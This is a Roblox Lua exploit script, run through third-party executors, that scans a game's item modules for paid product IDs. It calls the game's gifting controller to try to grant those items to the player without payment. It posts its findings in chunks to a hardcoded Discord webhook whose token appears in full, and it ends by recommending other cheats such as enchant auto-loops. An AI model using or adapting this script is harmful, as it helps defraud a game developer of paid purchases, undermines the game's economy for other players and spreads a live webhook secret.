-- Gift System Exploiter
-- Try to gift items to yourself

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

-- Webhook
local WEBHOOK_URL = "https://discord.com/api/webhooks/1455588039152767159/eFMjdTcF7MA_Yi3wE4UggQa6nFQMtBpCdY4Qo0A5OP_EAR8Yhkc4cNV4_kQLYStiyirP"
local HttpRequest = syn and syn.request or http_request or request or 
                    (fluxus and fluxus.request) or (krnl and krnl.request)

local function SendWebhook(payload)
    pcall(function()
        HttpRequest({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("🎁 GIFT SYSTEM EXPLOITER")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

local output = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
output = output .. "🎁 GIFT SYSTEM ANALYSIS\n"
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

-- Load required modules
local GamePassUtility = require(ReplicatedStorage.Shared.GamePassUtility)
local GiftingController

local controllerOk, controllerErr = pcall(function()
    GiftingController = require(ReplicatedStorage.Controllers.GiftingController)
end)

output = output .. "📦 MODULES STATUS:\n\n"
output = output .. "GamePassUtility: " .. (GamePassUtility and "✅ Loaded" or "❌ Failed") .. "\n"
output = output .. "GiftingController: " .. (controllerOk and "✅ Loaded" or "❌ Failed: " .. tostring(controllerErr)) .. "\n\n"

if not GamePassUtility then
    output = output .. "❌ Cannot proceed without GamePassUtility\n"
    print(output)
    return
end

-- Find giftable products
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
output = output .. "🔍 SCANNING GIFTABLE PRODUCTS:\n"
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

local giftableItems = {}

-- Scan all items for product IDs
for _, module in pairs(ReplicatedStorage.Items:GetChildren()) do
    if module:IsA("ModuleScript") then
        local ok, data = pcall(require, module)
        
        if ok and data and (data.SingleProductId or data.TenProductId) then
            local itemName = data.Data and data.Data.Name or module.Name
            local itemType = data.Data and data.Data.Type or "Unknown"
            
            -- Try to get gift data
            if data.SingleProductId then
                local giftOk, giftData = pcall(function()
                    return GamePassUtility:GetGiftData(data.SingleProductId)
                end)
                
                if giftOk and giftData then
                    table.insert(giftableItems, {
                        Name = itemName,
                        Type = itemType,
                        ProductId = data.SingleProductId,
                        GiftData = giftData,
                        Amount = "Single"
                    })
                end
            end
            
            if data.TenProductId then
                local giftOk, giftData = pcall(function()
                    return GamePassUtility:GetGiftData(data.TenProductId)
                end)
                
                if giftOk and giftData then
                    table.insert(giftableItems, {
                        Name = itemName,
                        Type = itemType,
                        ProductId = data.TenProductId,
                        GiftData = giftData,
                        Amount = "x10"
                    })
                end
            end
        end
    end
end

if #giftableItems > 0 then
    output = output .. "✅ Found " .. #giftableItems .. " giftable items!\n\n"
    
    for i, item in ipairs(giftableItems) do
        output = output .. i .. ". " .. item.Name .. " (" .. item.Amount .. ")\n"
        output = output .. "   Type: " .. item.Type .. "\n"
        output = output .. "   ProductId: " .. item.ProductId .. "\n"
        
        if item.GiftData then
            output = output .. "   GiftData:\n"
            for k, v in pairs(item.GiftData) do
                output = output .. "     " .. k .. " = " .. tostring(v) .. "\n"
            end
        end
        
        output = output .. "\n"
    end
else
    output = output .. "❌ No giftable items found\n\n"
end

-- Try to exploit gifting
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
output = output .. "🎯 EXPLOITATION ATTEMPTS:\n"
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

if controllerOk and GiftingController then
    output = output .. "✅ GiftingController available!\n\n"
    
    -- Check for exploitable methods
    output = output .. "📋 Available Methods:\n"
    for key, value in pairs(GiftingController) do
        if type(value) == "function" then
            output = output .. "  • " .. key .. "()\n"
        end
    end
    output = output .. "\n"
    
    -- Try to gift to yourself
    if #giftableItems > 0 then
        output = output .. "🧪 ATTEMPTING SELF-GIFT:\n\n"
        
        local testItem = giftableItems[1]
        output = output .. "Testing with: " .. testItem.Name .. "\n"
        output = output .. "ProductId: " .. testItem.ProductId .. "\n\n"
        
        -- Method 1: Try to open gift dialog with self as recipient
        local method1Ok, method1Err = pcall(function()
            if GiftingController.Open then
                GiftingController:Open(testItem.ProductId)
            end
        end)
        
        output = output .. "Method 1 (Open): " .. (method1Ok and "✅ Success" or "❌ " .. tostring(method1Err)) .. "\n"
        
        -- Method 2: Try to set self as recipient
        local method2Ok, method2Err = pcall(function()
            if GiftingController.SetRecipient then
                GiftingController:SetRecipient(LocalPlayer.UserId)
            end
        end)
        
        output = output .. "Method 2 (SetRecipient): " .. (method2Ok and "✅ Success" or "❌ " .. tostring(method2Err)) .. "\n"
        
        -- Method 3: Try to send gift
        local method3Ok, method3Err = pcall(function()
            if GiftingController.SendGift then
                GiftingController:SendGift(testItem.ProductId, LocalPlayer.UserId)
            end
        end)
        
        output = output .. "Method 3 (SendGift): " .. (method3Ok and "✅ Success" or "❌ " .. tostring(method3Err)) .. "\n\n"
        
        if method1Ok or method2Ok or method3Ok then
            output = output .. "⚠️ Some methods succeeded!\n"
            output = output .. "Check if item was added to inventory.\n"
            output = output .. "Note: Server validation likely blocks this.\n"
        else
            output = output .. "❌ All methods failed.\n"
            output = output .. "Gift system is properly secured.\n"
        end
    end
else
    output = output .. "❌ GiftingController not accessible\n"
    output = output .. "Cannot attempt exploitation\n"
end

output = output .. "\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
output = output .. "💡 FINDINGS:\n"
output = output .. "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

output = output .. "Gift System Security:\n"
output = output .. "  • Server-validated (likely)\n"
output = output .. "  • Requires Robux payment\n"
output = output .. "  • Recipient validation present\n\n"

output = output .. "Exploitation Difficulty: HIGH ⚠️\n"
output = output .. "Success Probability: VERY LOW\n\n"

output = output .. "⚠️ RECOMMENDATION:\n"
output = output .. "Gift system is NOT bypassable.\n"
output = output .. "Focus on other methods instead:\n"
output = output .. "  1. Enchant auto-loop\n"
output = output .. "  2. Event farming\n"
output = output .. "  3. Potion boosting\n"

print(output)

-- Send to Discord
SendWebhook({
    username = "UQiLL Gift Exploiter",
    avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmU4Nzs0XL0IjJK2U-7u2qqVEO9FnkQkzb3g&s",
    embeds = {{
        title = "🎁 Analyzing Gift System...",
        description = "Attempting to exploit gifting mechanics",
        color = 0x30ff6a
    }}
})

task.wait(1)

-- Split and send
local chunks = {}
local current = ""
for line in output:gmatch("[^\n]+") do
    if #current + #line > 1800 then
        table.insert(chunks, current)
        current = line .. "\n"
    else
        current = current .. line .. "\n"
    end
end
if #current > 0 then
    table.insert(chunks, current)
end

for _, chunk in ipairs(chunks) do
    SendWebhook({
        username = "UQiLL Gift Exploiter",
        avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmU4Nzs0XL0IjJK2U-7u2qqVEO9FnkQkzb3g&s",
        embeds = {{
            description = "```lua\n" .. chunk .. "```",
            color = 0x30ff6a
        }}
    })
    task.wait(1)
end

SendWebhook({
    username = "UQiLL Gift Exploiter",
    avatar_url = "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmU4Nzs0XL0IjJK2U-7u2qqVEO9FnkQkzb3g&s",
    embeds = {{
        title = "✅ Analysis Complete!",
        description = "Check results above",
        color = 0x30ff6a
    }}
})

print("\n✅ Results sent to Discord!")